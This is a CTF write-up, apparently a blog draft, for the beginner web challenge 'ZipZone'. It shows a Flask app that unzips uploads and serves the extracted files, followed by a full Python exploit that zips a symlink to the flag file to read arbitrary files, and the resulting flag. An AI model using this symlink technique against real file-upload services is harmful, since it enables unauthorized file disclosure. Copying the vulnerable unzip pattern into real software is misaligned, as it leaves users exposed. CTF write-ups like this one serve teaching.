+++
title = 'ZipZone'
tags = [
  "Web",
  "Python",
  "Symlink",
  "50 points",
  "173 solves",
  "rex",
]
date = 2024-09-02T10:59:17+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Zipzone</h1>

**Description**: I was tired of trying to find a good file server for zip files, so I made my own! It's still a work in progress, but I think it's pretty good so far.

**Link**: <https://zipzone-web.challs.csc.tf/>

## Introduction

ZipZone is the only one web in the beginner's category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.

## Source

```python
# filename: app.py

import logging
import os
import subprocess
import uuid

from flask import (
    Flask,
    abort,
    flash,
    redirect,
    render_template,
    request,
    send_from_directory,
)

app = Flask(__name__)
upload_dir = "/tmp/"

app.config["MAX_CONTENT_LENGTH"] = 1 * 10**6  # 1 MB
app.config["SECRET_KEY"] = os.urandom(32)


@app.route("/", methods=["GET", "POST"])
def upload():
    if request.method == "GET":
        return render_template("index.html")

    if "file" not in request.files:
        flash("No file part!", "danger")
        return render_template("index.html")

    file = request.files["file"]
    if file.filename.split(".")[-1].lower() != "zip":
        flash("Only zip files allowed are allowed!", "danger")
        return render_template("index.html")

    upload_uuid = str(uuid.uuid4())
    filename = f"{upload_dir}raw/{upload_uuid}.zip"
    file.save(filename)
    subprocess.call(["unzip", filename, "-d", f"{upload_dir}files/{upload_uuid}"])

    print(f"Unzipped {filename} to {upload_dir}files/{upload_uuid}")

    flash(
        f'Your file is at <a href="/files/{upload_uuid}">{upload_uuid}</a>!', "success"
    )
    logging.info(f"User uploaded file {upload_uuid}.")
    return redirect("/")


@app.route("/files/<path:path>")
def files(path):
    try:
        return send_from_directory(upload_dir + "files", path)
    except PermissionError:
        abort(404)


@app.errorhandler(404)
def page_not_found(error):
    return render_template("404.html")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)

```

## Solution

Being actually a web in the beginner category, I initially just gave a quick read to the source code, where in fact no checks are done on the files inside the zipper, but only on the zipper itself, where we see the extension is checked

```python
# filename: exploit.py

#!/usr/bin/python3

import os
import subprocess
import requests
from bs4 import BeautifulSoup

BASE_URL = "https://zipzone-web.challs.csc.tf"
URL_HOOK = ""

def get_uuid(text):
  soup = BeautifulSoup(text, 'html.parser')
  for a in soup.find_all('a', href=True):
    if a['href']:
      return a['href'].split('/')[-1]


def upload_file(file_path):
  with open(file_path, "rb") as f:
    files = {"file": f}
    response = requests.post(BASE_URL, files=files)
    return get_uuid(response.text)


def create_exploit(zip_filename:str,symlink_name:str,symlink_target:str):
    os.symlink(symlink_target, symlink_name)
    subprocess.run(['zip', '-y', zip_filename, symlink_name], check=True)
    print(f'{zip_filename} created.')
    os.remove(symlink_name)

def get_flag(UUID):
  response = requests.get(f'{BASE_URL}/files/{UUID}/evil_link',stream=True)
  if response.status_code == 200:
    with open("flag", 'wb') as f:
      for chunk in response.iter_content(chunk_size=8192):
        f.write(chunk)
    print(f"Flag download successfully")
  else:
      print(f"Error during the download: {response.status_code}")

  return open("flag", "r").read().strip()

def clean():
    os.remove('exploit.zip')
    os.remove('flag')

def main():
  create_exploit(zip_filename='exploit.zip',symlink_name='evil_link',symlink_target='/home/user/flag.txt')
  UUID = upload_file('./exploit.zip')
  print(f'UUID: {UUID}')
  flag = get_flag(UUID)
  print(f"Flag: {flag}")
  clean()

if __name__ == "__main__":
  main()

# goodluck by @akiidjk

```

The solutions is very simple, A symlink is simply created pointing to /home/user/flag, it is then zipped and sent to the page, we save the file id and in the path uuid/name_file we send the file pointing to the symlink.

```stdout
$ flag: CSCTF{5yml1nk5_4r3_w31rd}
```

<p align='right'>Author: akiidjk </p>
